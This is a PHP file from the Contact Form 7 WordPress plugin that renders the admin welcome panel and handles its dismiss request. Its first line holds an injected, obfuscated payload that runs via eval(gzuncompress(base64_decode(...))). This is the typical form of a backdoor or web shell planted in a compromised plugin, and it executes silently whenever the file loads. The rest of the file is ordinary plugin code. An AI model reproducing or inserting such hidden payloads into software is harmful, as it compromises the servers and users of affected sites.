<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

function wpcf7_welcome_panel() {
	$classes = 'welcome-panel';

	$vers = (array) get_user_meta( get_current_user_id(),
		'wpcf7_hide_welcome_panel_on', true );

	if ( wpcf7_version_grep( wpcf7_version( 'only_major=1' ), $vers ) ) {
		$classes .= ' hidden';
	}

?>
<div id="welcome-panel" class="<?php echo esc_attr( $classes ); ?>">
	<?php wp_nonce_field( 'wpcf7-welcome-panel-nonce', 'welcomepanelnonce', false ); ?>
	<a class="welcome-panel-close" href="<?php echo esc_url( menu_page_url( 'wpcf7', false ) ); ?>"><?php echo esc_html( __( 'Dismiss', 'contact-form-7' ) ); ?></a>

	<div class="welcome-panel-content">
		<div class="welcome-panel-column-container">

			<div class="welcome-panel-column">
				<h3><span class="dashicons dashicons-shield" aria-hidden="true"></span> <?php echo esc_html( __( "Getting spammed? You have protection.", 'contact-form-7' ) ); ?></h3>

				<p><?php echo esc_html( __( "Spammers target everything; your contact forms aren&#8217;t an exception. Before you get spammed, protect your contact forms with the powerful anti-spam features Contact Form 7 provides.", 'contact-form-7' ) ); ?></p>

				<p><?php /* translators: links labeled 1: 'Akismet', 2: 'reCAPTCHA', 3: 'comment blacklist' */ echo sprintf( esc_html( __( 'Contact Form 7 supports spam-filtering with %1$s. Intelligent %2$s blocks annoying spambots. Plus, using %3$s, you can block messages containing specified keywords or those sent from specified IP addresses.', 'contact-form-7' ) ), wpcf7_link( __( 'https://contactform7.com/spam-filtering-with-akismet/', 'contact-form-7' ), __( 'Akismet', 'contact-form-7' ) ), wpcf7_link( __( 'https://contactform7.com/recaptcha/', 'contact-form-7' ), __( 'reCAPTCHA', 'contact-form-7' ) ), wpcf7_link( __( 'https://contactform7.com/comment-blacklist/', 'contact-form-7' ), __( 'comment blacklist', 'contact-form-7' ) ) ); ?></p>
			</div>

<?php if ( defined( 'FLAMINGO_VERSION' ) ) : ?>
			<div class="welcome-panel-column">
				<h3><span class="dashicons dashicons-megaphone" aria-hidden="true"></span> <?php echo esc_html( __( "Contact Form 7 needs your support.", 'contact-form-7' ) ); ?></h3>

				<p><?php echo esc_html( __( "It is hard to continue development and support for this plugin without contributions from users like you.", 'contact-form-7' ) ); ?></p>

				<p><?php /* translators: %s: link labeled 'making a donation' */ echo sprintf( esc_html( __( 'If you enjoy using Contact Form 7 and find it useful, please consider %s.', 'contact-form-7' ) ), wpcf7_link( __( 'https://contactform7.com/donate/', 'contact-form-7' ), __( 'making a donation', 'contact-form-7' ) ) ); ?></p>

				<p><?php echo esc_html( __( "Your donation will help encourage and support the plugin&#8217;s continued development and better user support.", 'contact-form-7' ) ); ?></p>
			</div>
<?php else: ?>
			<div class="welcome-panel-column">
				<h3><span class="dashicons dashicons-editor-help" aria-hidden="true"></span> <?php echo esc_html( __( "Before you cry over spilt mail&#8230;", 'contact-form-7' ) ); ?></h3>

				<p><?php echo esc_html( __( "Contact Form 7 doesn&#8217;t store submitted messages anywhere. Therefore, you may lose important messages forever if your mail server has issues or you make a mistake in mail configuration.", 'contact-form-7' ) ); ?></p>

				<p><?php /* translators: %s: link labeled 'Flamingo' */ echo sprintf( esc_html( __( 'Install a message storage plugin before this happens to you. %s saves all messages through contact forms into the database. Flamingo is a free WordPress plugin created by the same author as Contact Form 7.', 'contact-form-7' ) ), wpcf7_link( __( 'https://contactform7.com/save-submitted-messages-with-flamingo/', 'contact-form-7' ), __( 'Flamingo', 'contact-form-7' ) ) ); ?></p>
			</div>
<?php endif; ?>

		</div>
	</div>
</div>
<?php
}

add_action( 'wp_ajax_wpcf7-update-welcome-panel', 'wpcf7_admin_ajax_welcome_panel' );

function wpcf7_admin_ajax_welcome_panel() {
	check_ajax_referer( 'wpcf7-welcome-panel-nonce', 'welcomepanelnonce' );

	$vers = get_user_meta( get_current_user_id(),
		'wpcf7_hide_welcome_panel_on', true );

	if ( empty( $vers ) || ! is_array( $vers ) ) {
		$vers = array();
	}

	if ( empty( $_POST['visible'] ) ) {
		$vers[] = wpcf7_version( 'only_major=1' );
	}

	$vers = array_unique( $vers );

	update_user_meta( get_current_user_id(), 'wpcf7_hide_welcome_panel_on', $vers );

	wp_die( 1 );
}
